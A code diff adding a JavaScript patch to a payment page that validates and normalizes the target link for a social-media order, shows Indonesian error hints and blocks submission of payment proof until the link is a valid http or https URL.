+  window.__kzSosmedLinkUrlValidationPatchApplied = true;
+
+  function byId(id){ return document.getElementById(id); }
+  function trim(v){ return String(v == null ? '' : v).trim(); }
+  function isSosmedOrder(){
+    try{ return !!(window.payState && payState.isSosmed); }catch(e){ return false; }
+  }
+  function normalizeTargetLink(v){
+    var s = trim(v);
+    if(!s) return '';
+    try{
+      if(typeof window.kzSafeUrl === 'function'){
+        var safe = window.kzSafeUrl(s) || '';
+        if(safe) return safe;
+      }
+    }catch(e){}
+    if(!/^https?:\/\/\S+$/i.test(s)) return '';
+    try{ return new URL(s).href; }catch(e){ return ''; }
+  }
+  function ensureUi(){
+    var input = byId('paySosmedLinkInput');
+    if(input){
+      input.setAttribute('type', 'url');
+      input.setAttribute('inputmode', 'url');
+      input.setAttribute('autocapitalize', 'off');
+      input.setAttribute('autocomplete', 'off');
+      input.setAttribute('spellcheck', 'false');
+      input.setAttribute('placeholder', 'Masukan link target..');
+      if(!input.dataset.kzUrlValidationBound){
+        input.dataset.kzUrlValidationBound = '1';
+        input.addEventListener('input', function(){
+          syncUi(false);
+          try{ if(typeof window.validatePaySendButton === 'function') window.validatePaySendButton(); }catch(e){}
+        }, true);
+        input.addEventListener('blur', function(){
+          syncUi(true);
+          try{ if(typeof window.validatePaySendButton === 'function') window.validatePaySendButton(); }catch(e){}
+        }, true);
+      }
+    }
+    var field = byId('paySosmedLinkField');
+    if(field && !byId('paySosmedLinkHint')){
+      var hint = document.createElement('div');
+      hint.id = 'paySosmedLinkHint';
+      field.appendChild(hint);
+    }
+  }
+  function syncUi(normalizeOnBlur){
+    ensureUi();
+    var input = byId('paySosmedLinkInput');
+    var hidden = byId('payFormTargetLink');
+    var row = byId('payRowTargetLink');
+    var valEl = byId('paySumTargetLink');
+    var hint = byId('paySosmedLinkHint');
+    var active = isSosmedOrder();
+    var raw = trim(input ? input.value : '');
+    var safe = normalizeTargetLink(raw);
+    var empty = !raw;
+    var invalid = !!raw && !safe;
+
+    if(input){
+      input.classList.toggle('kz-invalid', active && invalid);
+      if(active && safe && normalizeOnBlur && document.activeElement !== input){
+        input.value = safe;
+      }
+    }
+
+    if(hint){
+      hint.classList.remove('kz-error');
+      hint.style.display = 'none';
+      hint.textContent = '';
+      if(active && empty){
+        hint.style.display = 'block';
+        hint.textContent = '';
+      }else if(active && invalid){
+        hint.style.display = 'block';
+        hint.classList.add('kz-error');
+        hint.textContent = 'Target harus berupa link, contoh: https://xxx';
+      }
+    }
+
+    if(hidden) hidden.value = (active && safe) ? safe : '';
+    if(row) row.style.display = (active && safe) ? 'flex' : 'none';
+    if(valEl) valEl.textContent = safe || '-';
+
+    try{
+      if(window.payState){
+        payState.sosmedLink = (active && safe) ? safe : '';
+        if(typeof window.savePayStorage === 'function') window.savePayStorage();
+      }
+    }catch(e){}
+
+    return {
+      active: active,
+      raw: raw,
+      safe: safe,
+      empty: empty,
+      invalid: invalid,
+      ok: !active || !!safe
+    };
+  }
+
+  var oldValidatePaySendButton = window.validatePaySendButton;
+  if(typeof oldValidatePaySendButton === 'function' && !oldValidatePaySendButton.__kzSosmedUrlValidationWrapped){
+    var wrappedValidate = function(){
+      var res = oldValidatePaySendButton.apply(this, arguments);
+      var state = syncUi(false);
+      var btn = byId('payBtnSend');
+      if(btn && state.active && !state.ok){
+        try{ btn.classList.add('kz-soft-disabled'); }catch(e){}
+      }
+      return res;
+    };
+    wrappedValidate.__kzSosmedUrlValidationWrapped = true;
+    window.validatePaySendButton = wrappedValidate;
+  }
+
+  var oldSendPaymentProof = window.sendPaymentProof;
+  if(typeof oldSendPaymentProof === 'function' && !oldSendPaymentProof.__kzSosmedUrlValidationWrapped){
+    var wrappedSend = function(){
+      var state = syncUi(true);
+      if(state.active && state.empty){
+        try{ if(typeof window.setPayStatus === 'function') window.setPayStatus('⚠️ Isi link target sosmed terlebih dahulu.'); }catch(e){}
+        try{ var input = byId('paySosmedLinkInput'); if(input) input.focus(); }catch(e){}
+        return;
+      }
+      if(state.active && state.invalid){
+        try{ if(typeof window.setPayStatus === 'function') window.setPayStatus('⚠️ Link target harus berupa URL valid dan diawali http:// atau https://'); }catch(e){}
+        try{ var input2 = byId('paySosmedLinkInput'); if(input2) input2.focus(); }catch(e){}
+        return;
+      }
+      return oldSendPaymentProof.apply(this, arguments);
+    };
+    wrappedSend.__kzSosmedUrlValidationWrapped = true;
+    window.sendPaymentProof = wrappedSend;
+  }
+
+  function boot(){
+    ensureUi();
+    syncUi(false);
+    try{ if(typeof window.validatePaySendButton === 'function') window.validatePaySendButton(); }catch(e){}
+  }
+
+  if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', boot, {once:true});
+  else boot();
+
+  try{ window.addEventListener('pageshow', boot); }catch(e){}
 })();
 </script>
 
